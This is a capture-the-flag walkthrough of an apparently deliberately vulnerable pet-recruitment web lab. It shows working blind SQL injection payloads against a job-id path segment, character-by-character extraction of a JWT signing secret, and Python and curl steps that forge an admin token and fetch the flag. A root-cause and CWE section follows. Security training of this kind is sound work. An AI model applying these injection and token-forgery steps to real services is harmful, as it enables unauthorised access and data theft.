# furhire-002 - BugForge Lab Walkthrough

**Difficulty:** Medium (50 pts)
**Tags:** SQLi, Secrets, JWT
**Vulnerability:** Integer-based blind SQL injection in a URL path segment, leading to disclosure of the JWT signing secret and forgery of an admin token
**Flag:** `bug{hV50baYcsdSIBynfn8u2VMkzc0eoC1HA}`

---

## Summary

FurHire is a pet-recruitment platform (Express + SQLite + Socket.io, HS256 JWT held in `localStorage`). Every obvious user-facing input is properly parameterised: login, registration, job search and filters, profile/company updates, and the application-status update endpoint all treat quotes as literal data. The one unparameterised sink is the numeric `:id` path segment of `GET /api/jobs/:id`, which is concatenated straight into `WHERE id = <id>`. Because the endpoint returns the matching row (or `{"error":"Job not found"}`), it is a clean boolean oracle.

Boolean-blind extraction dumps a `config` table containing `jwt_secret = phonesCheeseTiramisu1199`. Signing a `{"role":"admin"}` token with that secret and calling `GET /api/admin/flag` returns the flag.

---

## Tech Stack

- Express (server-rendered pages with inline `<script>` blocks, `x-powered-by: Express`)
- SQLite (confirmed via `sqlite_master`/`sqlite_sequence` and the `config` schema)
- Socket.io for live notifications
- Auth: HS256 JWT in `localStorage`, sent as `Authorization: Bearer`

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
| --- | --- | --- | --- |
| `/api/register` | POST | none | `role` field ignored beyond legit `user`/`recruiter`; no `admin` mass-assign |
| `/api/login` | POST | none | username-based, parameterised |
| `/api/jobs/:id` | GET | user | VULNERABLE: integer-context blind SQLi in `:id` |
| `/api/admin/flag` | GET | admin JWT | returns `{"flag":"..."}`, hidden (404 to non-admin) |

---

## Attack Chain

### 1. Register and grab a JWT

```bash
curl -s -X POST "$T/api/register" -H 'Content-Type: application/json' \
  -d '{"username":"atk2","email":"atk2@evil.invalid","password":"Password123!","full_name":"x"}'
```

The token decodes to `{"id":7,"username":"atk2","role":"user","iat":...}` (HS256).

### 2. Confirm blind SQLi on the job-id path

The id is used in an integer context, so no quotes are needed:

```
GET /api/jobs/2-1            -> job 1         (arithmetic evaluated)
GET /api/jobs/1 AND 1=1      -> job 1         (TRUE)
GET /api/jobs/1 AND 1=2      -> Job not found  (FALSE)
GET /api/jobs/1-- -          -> job 1         (comment terminates the query)
GET /api/jobs/1' AND '1'='1  -> Job not found  (wrong, quote context, confirms numeric)
```

Oracle: response contains `"title"` == condition TRUE.

### 3. Enumerate the schema

`sqlite_master` yields 9 tables: `users`, `sqlite_sequence`, `user_profiles`, `companies`, `jobs`, `applications`, `saved_jobs`, `notifications`, `config`.

The `config` table is a key/value store:

```
CREATE TABLE config (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  key TEXT UNIQUE NOT NULL,
  value TEXT NOT NULL,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)
```

### 4. Extract the JWT secret

Boolean-blind primitives against the oracle:

```
1 AND (SELECT count(*) FROM config) > N                                   -- row count
1 AND unicode(substr((SELECT value FROM config LIMIT 1 OFFSET 0),i,1)) > M -- char by char
```

Result: `jwt_secret = phonesCheeseTiramisu1199`.

A persistent-connection, threaded extractor (one thread per character position, each running its own binary search over the code point) pulls a full column in about 20 seconds.

### 5. Forge an admin token and read the flag

```python
import jwt
jwt.encode({"id":1,"role":"admin"}, "phonesCheeseTiramisu1199", algorithm="HS256")
```

```bash
curl -s "$T/api/admin/flag" -H "Authorization: Bearer $ADMIN_JWT"
# {"flag":"bug{hV50baYcsdSIBynfn8u2VMkzc0eoC1HA}"}
```

---

## Discovery Notes

- The "SQLi / Secrets / JWT" tag plus a JWT in `localStorage` pointed at a forge-after-leak chain.
- A rockyou brute of the HS256 secret (`hashcat -m 16500`) found no hit, so the secret is high entropy and must be read, not cracked. That is the signal to go looking for a SQLi that reaches a secrets table.
- The injectable point is the path segment, not a query or body parameter. That is why the intended solve uses `sqlmap -u .../api/jobs/1* --level 3` with a `*` marker: sqlmap does not test a path segment by default.
- UNION did not reflect (the SELECT joins companies and uses a correlated subquery for the application count), so boolean-blind is the reliable route.

---

## Dead Ends

| Tried | Result | Lesson |
| --- | --- | --- |
| SQLi in `search` / `location` / `job_type` query params | parameterised, escaped | the obvious params were decoys |
| Login username auth bypass (`admin'-- -`) | parameterised | - |
| Company / profile / status-update fields | quote stored verbatim | parameterised writes |
| rockyou crack of the JWT | no hit | secret must be leaked, not cracked |
| `alg:none` forge | 403 Invalid token | verifier enforces HS256 |
| UNION SELECT (1..24 cols) | never reflected | JOIN + correlated subquery blocks UNION, use blind |

---

## Root Causes

- `GET /api/jobs/:id` interpolates the raw path segment into SQL (`WHERE id = <id>`) instead of binding it as a parameter.
- A signing secret is stored in an application database table that the same injection can read.
- HS256 with a shared symmetric secret means any disclosure of that secret is full token forgery.

---

## CWE / OWASP

- CWE-89 (SQL Injection), CWE-522 / CWE-798 (secret exposure / hardcoded credential in DB), CWE-347 (improper verification of a cryptographic signature via forgeable HS256)
- OWASP A03:2021 Injection, A07:2021 Identification and Authentication Failures
